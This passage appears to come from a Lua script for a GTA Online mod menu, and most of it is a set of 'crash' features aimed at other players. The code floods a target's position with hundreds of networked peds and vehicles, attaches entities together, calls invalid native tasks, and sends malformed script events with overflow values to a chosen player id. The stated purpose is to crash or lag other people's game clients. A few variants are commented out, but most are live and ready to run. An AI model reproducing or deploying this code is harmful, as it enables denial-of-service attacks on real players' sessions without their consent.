            ai.task_start_scenario_in_place(mdl2, "CTaskInVehicleBasic", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskAmbientClips", 0, false)
            ai.task_start_scenario_in_place(mdl3, "CTaskAmbientClips", 0, false)
            ped.set_ped_into_vehicle(mdl, veh, -1)
            ped.set_ped_into_vehicle(mdl2, veh, -1)
            natives.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            natives.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskExitVehicle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskExitVehicle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        streaming.set_model_as_no_longer_needed(mdl)
        streaming.set_model_as_no_longer_needed(mdl2)
        streaming.set_model_as_no_longer_needed(veh_mdl)
        streaming.set_model_as_no_longer_needed(veh_mdl2)
        entity.delete_entity(mdl)
        entity.delete_entity(mdl2)
        entity.delete_entity(mdl3)
        entity.delete_entity(mdl4)
        entity.delete_entity(veh_mdl)
        entity.delete_entity(veh_mdl2)
        system.yield(1000)
		else
		f.on = false
		menu.notify("Invalid Player.", AddictScript, 3, 211)
		return
		 end
	  end
   end)

menu.add_player_feature("Crash - Big Chungus", "action", playerparents["Lobby Crashes"], function(f, pid)
		if player.is_player_valid(player.player_id()) then
        local ped_ = player.get_player_ped(player.player_id())
        local pos = entity.get_entity_coords(ped_)
        local mdl = gameplay.get_hash_key("A_C_Cat_01")
        local mdl2 = gameplay.get_hash_key("U_M_Y_Zombie_01")
        local mdl3 = gameplay.get_hash_key("A_F_M_ProlHost_01")
        local mdl4 = gameplay.get_hash_key("A_M_M_SouCent_01")
        local veh_mdl = gameplay.get_hash_key("insurgent2")
        local veh_mdl2 = gameplay.get_hash_key("brawler")
        utilities.request_model(veh_mdl)
        utilities.request_model(veh_mdl2)
        utilities.request_model(mdl)
        utilities.request_model(mdl2)
        utilities.request_model(mdl3)
        utilities.request_model(mdl4)
        for i = 1, 250 do
        local ped1 = ped.create_ped(1, mdl, pos + 20, 0, true, true)
        local ped_ = ped.create_ped(1, mdl2, pos + 20, 0, true, true)
        local ped3 = ped.create_ped(1, mdl3, pos + 20, 0, true, true)
        local ped3 = ped.create_ped(1, mdl4, pos + 20, 0, true, true)
        local veh = vehicle.create_vehicle(veh_mdl, pos + 20, 0, true, true)
        local veh2 = vehicle.create_vehicle(veh_mdl2, pos + 20, 0, true, true)
        ped.set_ped_into_vehicle(ped1, veh, -1)
        ped.set_ped_into_vehicle(ped_, veh, -1)
        ped.set_ped_into_vehicle(ped1, veh2, -1)
        ped.set_ped_into_vehicle(ped_, veh2, -1)
        ped.set_ped_into_vehicle(ped1, veh, -1)
        ped.set_ped_into_vehicle(ped_, veh, -1)
        ped.set_ped_into_vehicle(ped1, veh2, -1)
        ped.set_ped_into_vehicle(ped_, veh2, -1)
        ped.set_ped_into_vehicle(mdl3, veh, -1)
        ped.set_ped_into_vehicle(mdl3, veh2, -1)
        ped.set_ped_into_vehicle(mdl4, veh, -1)
        ped.set_ped_into_vehicle(mdl4, veh2, -1)
        natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        natives.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            system.yield(100)
            ped.set_ped_component_variation(mdl, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 0, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 0, 0, 0)
            ped.set_ped_component_variation(mdl3, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl3, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl3, 0, 0, 0, 0)
            ped.set_ped_component_variation(mdl4, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl4, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl4, 0, 0, 0, 0)
            ped.clear_ped_tasks_immediately(mdl)
            ped.clear_ped_tasks_immediately(mdl2)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl3, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl4, "CTaskDoNothing", 0, false)
            natives.SET_ENTITY_HEALTH(mdl, false, 200)
            natives.SET_ENTITY_HEALTH(mdl2, false, 200)
            natives.SET_ENTITY_HEALTH(mdl3, false, 200)
            natives.SET_ENTITY_HEALTH(mdl4, false, 200)
    
            ped.set_ped_component_variation(mdl, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 0, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 0, 0, 0)
            ped.clear_ped_tasks_immediately(mdl2)
            ai.task_start_scenario_in_place(mdl2, "CTaskInVehicleBasic", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskAmbientClips", 0, false)
            ai.task_start_scenario_in_place(mdl3, "CTaskAmbientClips", 0, false)
            ped.set_ped_into_vehicle(mdl, veh, -1)
            ped.set_ped_into_vehicle(mdl2, veh, -1)
            natives.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            natives.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskExitVehicle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskExitVehicle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            ai.task_start_scenario_in_place(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        streaming.set_model_as_no_longer_needed(mdl)
        streaming.set_model_as_no_longer_needed(mdl2)
        streaming.set_model_as_no_longer_needed(veh_mdl)
        streaming.set_model_as_no_longer_needed(veh_mdl2)
        entity.delete_entity(mdl)
        entity.delete_entity(mdl2)
        entity.delete_entity(mdl3)
        entity.delete_entity(mdl4)
        entity.delete_entity(veh_mdl)
        entity.delete_entity(veh_mdl2)
		 end
   end)

--[[

function GetLocalPed()
    return player.player_id()
end

local kachow = menu.add_feature("Ka-Chow", "parent")

local to_ply = 1
kachow = menu.add_feature("Crash People", "action", kachow.id, function(f)
    if player.is_player_in_any_vehicle(GetLocalPed(), false) then
        local jet = vehicle.get_vehicle_brand(GetLocalPed(), false)
		natives.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
		if pid ~= player.player_id(to_ply)  then
            local asda = entity.get_entity_coords(to_ply)
--            entity.set_entity_coords(pid, jet, asda.x, asda.y, asda.z + 50, false, false, false, true)
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = math.random(1)
            player.get_player_coords(jet, let_coords, let_coords, let_coords, false, false, false, true)
		end
--			entity.set_entity_velocity(jet, v3(0, 0, 0)) -- velocity sync fuck
--			entity.set_entity_rotation(jet, 0, 0, 0, 2, true) -- rotation sync fuck
			local pedpos = player.get_player_coords(GetLocalPed())
			pedpos.z = pedpos.z + 10
		for i = 1, 2 do
--			local s_plane = vehicle.create_vehicle(0x2062352D, i, player.get_player_coords(player.player_id()) + v3(5, 0, 0), 0, true, false)
			streaming.request_model(0x2062352D, i)
--            local veha1 = vehicle.create_vehicle(pedpos, 0)

--            entity.attach_entity_to_entity(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true, true, true, true, 2)
        end
--        AddEntityToList("Plane: ", jet, true)
        system.wait(5000)
        for i = 1, 50 do
--            entity.set_entity_coords_no_offset(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            system.wait()
        end
    else
        system.wait("Alert | You are not in a vehicle")
		streaming.request_model(0x39D6E83F)
		local spawn_in = vehicle.create_vehicle(0x39D6E83F, player.get_player_coords(player.player_id()) + v3(5, 0, 0), 0, true, false)
		ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), spawn_in, -1)
    end
end)

]]

bad_para_crash = menu.add_player_feature("Virgin Crash", "toggle", playerparents["Lobby Crashes"], function(f, pid)
pos = player.get_player_coords(pid)
cargobob = spawn_vehicle(0XFCFCB68B,pos,0)
vehicle = spawn_vehicle(0X187D938D,pos,0)
newRope = rope.add_rope(pos,v3(0,0,10),1,1,0,1,1,false,false,false,1.0,false)
rope.attach_entities_to_rope(newRope,cargobob,vehicle,entity.get_entity_coords(cargobob),entity.get_entity_coords(vehicle),2 ,0,0,"Center","Center")
system.wait(100)
end)

menu.add_player_feature("^^^^^STAY FAR FROM PLAYER'S^^^^^", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
menu.notify("WHY YOU CLICKING THIS FOOL XD")
if type(feat) == "number" then
return HANDLER_POP
end
local count = 4
for i = 0, 3 do
count = count - 1
if count == 0 then count = "CRASH!!!" end
network.send_chat_message(count, false)
system.yield(1000)
menu.notify("WHY YOU CLICKING THIS FOOL XD")
end
return HANDLER_POP
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)



playerparents["Player Crashes"] = menu.add_player_feature("Player Crashes", "parent", playerparents["Crashes And Kicks"]).id

menu.add_player_feature("Crash - Lag with Hydras", "toggle", playerparents["Player Crashes"], function(f, pid)
	if f.on then
		local pos = player.get_player_coords(pid)
		local veh_hash = 0x39D6E83F
	streaming.request_model(veh_hash)
	while (not streaming.has_model_loaded(veh_hash)) do
	system.wait(10)
	end
	local tableOfVehicles = {}
	for i = 1, 175 do
	tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
	end
	system.wait(1)
	for i = 175, #tableOfVehicles do
	end
	tableOfVehicles = {}
	streaming.set_model_as_no_longer_needed(veh_hash)
	network.request_control_of_entity(veh_hash)
	for i = 1, 175 do
		system.yield(10)
		local velocity = entity.get_entity_velocity(player.get_player_vehicle(player.player_id()))
		system.yield(10)
		tableOfVehicles[i] = vehicle.create_vehicle(0, 0x3F039CBA, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
		network.request_control_of_entity(tableOfVehicles[i])
		entity.attach_entity_to_entity(tableOfVehicles[i], veh_hash, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
		entity.set_entity_rotation(player.get_player_vehicle(player.player_id()), v3(cam.get_gameplay_cam_rot().x, 0, cam.get_gameplay_cam_rot().z))
		entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), velocity)
		tableOfVehicles[i + 5] = vehicle.create_vehicle(0, 0x856CFB02, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
		network.request_control_of_entity(tableOfVehicles[i + 5])
		entity.attach_entity_to_entity(tableOfVehicles[i + 5], veh_hash, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
		entity.set_entity_rotation(player.get_player_vehicle(player.player_id()), v3(cam.get_gameplay_cam_rot().x, 0, cam.get_gameplay_cam_rot().z))
		entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), velocity)
		tableOfVehicles[i + 10] = vehicle.create_vehicle(0, 0x2D7030F3, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
		network.request_control_of_entity(tableOfVehicles[i + 10])
		entity.attach_entity_to_entity(tableOfVehicles[i + 10], veh_hash, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
		entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), v3(cam.get_gameplay_cam_rot().x, 0, cam.get_gameplay_cam_rot().z))
		entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), velocity)
		
	end
		end
	return HANDLER_CONTINUE
	end)

menu.add_player_feature("Crash - Lag with Cargos", "toggle", playerparents["Player Crashes"], function(f, pid)
	if f.on then
		local pos = player.get_player_coords(pid)
		local veh_hash = 0x15F27762
	streaming.request_model(veh_hash)
	while (not streaming.has_model_loaded(veh_hash)) do
	system.wait(10)
	end
	local tableOfVehicles = {}
	for i = 1, 75 do
	tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
	end
	system.wait(1)
	for i = 1, #tableOfVehicles do
	end
	tableOfVehicles = {}
	streaming.set_model_as_no_longer_needed(veh_hash)
		end
	return HANDLER_CONTINUE
	end)
	
	menu.add_player_feature("Crash - Lag with Subs", "toggle", playerparents["Player Crashes"], function(f, pid)                                                                                                                                                                                                                                                  
		if f.on then
			local pos = player.get_player_coords(pid)
			local veh_hash = 0x4FAF0D70
	streaming.request_model(veh_hash)
	while (not streaming.has_model_loaded(veh_hash)) do
	system.wait(10)
	end
	local tableOfVehicles = {}
	for i = 1, 75 do
	  tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
	end
	system.wait(1000)
	for i = 1, #tableOfVehicles do
	  entity.delete_entity(tableOfVehicles[i])
	end
	tableOfVehicles = {}
	streaming.set_model_as_no_longer_needed(veh_hash)
			end
		return HANDLER_CONTINUE
	end)

	menu.add_player_feature("Crash - Lag with Dump Trucks", "toggle", playerparents["Player Crashes"], function(f, pid)                                                                                                                                                                                                                                                          
		if f.on then
			local pos = player.get_player_coords(pid)
			local veh_hash = 0x810369E2 
	
	streaming.request_model(veh_hash)
	while (not streaming.has_model_loaded(veh_hash)) do
	system.wait(10)
	end
	local tableOfVehicles = {}
	for i = 1, 75 do
	  tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
	end
	system.wait(1000)
	for i = 1, #tableOfVehicles do
	  entity.delete_entity(tableOfVehicles[i])
	end
	tableOfVehicles = {}
	streaming.set_model_as_no_longer_needed(veh_hash)
			end
		return HANDLER_CONTINUE
	end)

menu.add_player_feature("Crash - Wade Crash" , "toggle", playerparents["Player Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
menu.notify("Sent crash get ready (dont spectate)!", "Wade Crash", 10, ff0000)
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
system.wait(100)
end
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
system.wait(100)
end
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
system.wait(100)
end	
menu.notify("Crash complete!(dont spectate if there still here)", 10, ff0000)
system.wait(100)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)
--[[
menu.add_player_feature("Crash - Rebound" , "toggle", playerparents["Player Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
        local ped = natives.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = player.get_player_coords(pid)
        local mdl = gameplay.get_hash_key("mp_m_freemode_01")
        local veh_mdl = gameplay.get_hash_key("taxi")
        streaming.request_model(veh_mdl)
        streaming.request_model(mdl)
            for i = 1, 10 do
                if not player.is_player_valid(pid) then
                    return
                end
                local veh = vehicle.create_vehicle(veh_mdl, pos, 0)
                local jesus = ped.create_ped(2, mdl, pos, 0, true, false)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
				utilities.request_control_silent(jesus)
				utilities.hard_remove_entity(jesus)
				utilities.request_control_silent(veh)
				utilities.hard_remove_entity(veh)
            end  
        streaming.set_model_as_no_longer_needed(mdl)
        streaming.set_model_as_no_longer_needed(veh_mdl)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)
]]
menu.add_player_feature("Crash - Cancer Crash", "toggle", playerparents["Player Crashes"], function(f, pid)
if player.is_player_valid(pid) then
        local vehs = {}
        local c = player.get_player_coords(pid)
        local m = {
            "dubsta",
            "astron",
            "huntley",
            "patriot",
            "ingot",
            "asea",
            "stratum",
            "adder",
            "ninef",
            "baller",
            "comet2",
            "zentorno",
            "bifta",
        }
        
        for i=1,#m do
            local h = gameplay.get_hash_key(m[i])
            menu.notify(h)
            streaming.request_model(h)
            while not streaming.has_model_loaded(h) do
                system.wait(0)
            end
            c.z = c.z + 1.0
            vehs[i] = vehicle.create_vehicle(h, c, 0, true, false)
            streaming.set_model_as_no_longer_needed(h)
        end
        while f.on do
            for i=1,#vehs do
                entity.set_entity_visible(vehs[i], false)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 0, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 1, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 2, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 3, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 4, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 5, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 6, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 7, true)
                system.wait(0)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 0, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 1, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 2, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 3, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 4, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 5, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 6, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 7, false)
            end
            system.wait(100)
            for i=1,#vehs do
                network.request_control_of_entity(vehs[i])
                native.call(0x115722B1B9C14C1C, vehs[i])
            end
            system.wait(100)
        end
        for i=1,#vehs do
            entity.delete_entity(vehs[i])
			return
		end
	end
end)



menu.add_player_feature("Crash - Invalid Task Crash", "toggle", playerparents["Player Crashes"], function(f, pid)
    allvehicles = vehicle.get_all_vehicles()
    for i=1, #allvehicles do
        network.request_control_of_entity(allvehicles[i])
        native.call(0xF75B0D629E1C063D,player.get_player_ped(pid),allvehicles[i],1)
        native.call(0xC429DCEEB339E129,player.get_player_ped(pid),allvehicles[i],17,1)
        entity.set_entity_coords_no_offset(allvehicles[i], entity.get_entity_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10)
        system.yield()
    end
    menu.notify("Finished", "Invalid Task Crash")
end)

--[[
menu.add_player_feature("Crash - Midnight Brute", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, -788905164})
		script.trigger_script_event(962740265, pid, {player.player_id(), 4294894682, -4294904289, -788905164})
		menu.notify("Midnight Brute Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - Stand Elegant", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(962740265, pid, {-72614, 63007, 59027, -12012, -26996, 33398, pid})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, -72614, 63007, 59027, -12012, -26996, 33398, pid})
		menu.notify("Stand Elegant Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - Cherax", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, 23243, 5332, 3324, pid})
		script.trigger_script_event(962740265, pid, {player.player_id(), 23243, 5332, 3324, pid})
		menu.notify("Cherax Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - 0xCheats", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(962740265, pid, {player.player_id(), pid, 30583, pid, pid, pid, pid, -328966, 10128444})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, pid, 30583, pid, pid, pid, pid, -328966, 10128444})
		menu.notify("0xCheats Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - xForce Basic", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(962740265, pid, {player.player_id(), 95398, 98426, -24591, 47901, -64814})
		script.trigger_script_event(962740265, pid, {player.player_id(), 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
		script.trigger_script_event(677240627, pid, {player.player_id(), -1774405356})
		menu.notify("xForce Basic Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - Yo Momma", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		utilities.request_model(0x303638A7)
		local table_of_all_peds = {}
		local table_of_all_vehicles = {}
        local hashes = {956849991, 1133471123, 2803699023, 386089410, 1549009676}
		local yo_momma = ped.create_ped(0, 0x303638A7, player.get_player_coords(pid) + v3(300, 300, 300), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
		network.request_control_of_entity(yo_momma)
		for i = 1, 5 do
			table_of_all_peds[i] = ped.create_ped(0, 0x3F039CBA, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i])
			entity.attach_entity_to_entity(table_of_all_peds[i], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
			table_of_all_peds[i + 5] = ped.create_ped(0, 0x856CFB02, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i + 5])
			entity.attach_entity_to_entity(table_of_all_peds[i + 5], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
			table_of_all_peds[i + 10] = ped.create_ped(0, 0x2D7030F3, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i + 10])
			entity.attach_entity_to_entity(table_of_all_peds[i + 10], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
		end
        for i = 1, #hashes do
            utilities.request_model(hashes[i])
            table_of_all_vehicles[i] = vehicle.create_vehicle(hashes[i], player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
            network.request_control_of_entity(table_of_all_vehicles[i])
			entity.attach_entity_to_entity(table_of_all_vehicles[i], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, false, 0, true)
        end
		system.wait(0)
		network.request_control_of_entity(yo_momma)
		entity.set_entity_coords_no_offset(yo_momma, player.get_player_coords(pid))
		system.wait(2000)
		for i = 1, 15 do
			if entity.is_an_entity(table_of_all_peds[i]) then
				network.request_control_of_entity(table_of_all_peds[i])
				entity.delete_entity(table_of_all_peds[i])
			end
		end
		for i = 1, 5 do
			if entity.is_an_entity(table_of_all_vehicles[i]) then
				network.request_control_of_entity(table_of_all_vehicles[i])
				entity.delete_entity(table_of_all_vehicles[i])
			end
		end
		if yo_momma then
			network.request_control_of_entity(yo_momma)
			utilities.hard_remove_entity(yo_momma)
		end
		system.wait(1)
		script.trigger_script_event(-371781708, pid, {player.player_id(), pid, pid, 1403904671})
		system.wait(1)
		script.trigger_script_event(-317318371, pid, {player.player_id(), pid, pid, 1993236673})
		system.wait(1)
		script.trigger_script_event(911179316, pid, {player.player_id(), pid, pid, pid, 1234567990, pid, pid})
		system.wait(1)
		script.trigger_script_event(846342319, pid, {player.player_id(), 578162304, 1})
		system.wait(1)
		script.trigger_script_event(-2085853000, pid, {player.player_id(), pid, 1610781286, pid, pid})
		system.wait(1)
		script.trigger_script_event(-1991317864, pid, {player.player_id(), 3, 935764694, pid, pid})
		system.wait(1)
		script.trigger_script_event(-1970125962, pid, {player.player_id(), pid, 1171952288})
		system.wait(1)
		script.trigger_script_event(-1013679841, pid, {player.player_id(), pid, 2135167326, pid})
		system.wait(1)
		script.trigger_script_event(-1767058336, pid, {player.player_id(), 1459620687})
		system.wait(1)
		script.trigger_script_event(-1892343528, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(1494472464, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(69874647, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(998716537, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(522189882, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(1514515570, pid, {player.player_id(), pid, 2147483647})
		system.wait(1)
		script.trigger_script_event(-393294520, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(-1386010354, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
